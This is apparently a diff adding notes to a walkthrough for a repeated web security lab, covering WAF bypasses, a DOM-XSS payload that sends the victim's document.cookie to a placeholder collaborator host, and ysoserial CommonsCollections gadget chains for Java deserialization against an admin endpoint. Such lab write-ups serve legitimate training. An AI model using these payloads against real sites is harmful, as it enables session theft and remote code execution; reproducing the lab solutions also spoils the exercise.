@@ -47,3 +47,23 @@ curl -sk https://TARGET/admin -H "Cookie: session=$ADMIN_SESSION; admin-prefs=$P
 Notes: `ysoserial` needs Java 8/11. `java -jar ysoserial.jar` lists gadgets. If `/admin` 500s but the
 callback stays silent, the gadget chain is not on the classpath - try `CommonsCollections1..7`,
 `Groovy1`, `Spring1`.
+
+---
+
+## Cross-instance variations (confirmed over 3 solves)
+
+- **Endpoint names and the stage-1 WAF vary** even when the vuln classes repeat
+  (`/admin` vs `/admin_panel`, `/advanced_search` vs `/filtered_search`, `SearchTerm` vs `find`).
+  Always re-map; don't assume the prior chain's names/filters carry over.
+- **DOM-XSS WAF may block parentheses `()`** instead of dot-notation. Then `"-PAYLOAD-"` only works
+  for function calls; an assignment throws "Invalid left-hand side". Use a statement breakout and
+  exfil via `location=` (not `fetch()`):
+  ```
+  ?find="};location=`//COLLAB/?x=`+document.cookie;//
+  ```
+- **The deserialization gadget varies** - CC6/CC7 on one instance, CC2/CC4 on another. Cycle
+  CommonsCollections1..7 with a unique Collaborator subdomain each, and judge success ONLY by the
+  OOB callback: **HTTP 500 is not a fire signal** (any garbage `admin-prefs` value also 500s; a
+  valid session with no `admin-prefs` returns 200).
+- Admin creds and the secret are sometimes reused across spawns, sometimes fresh - try the known
+  values first, then re-extract.
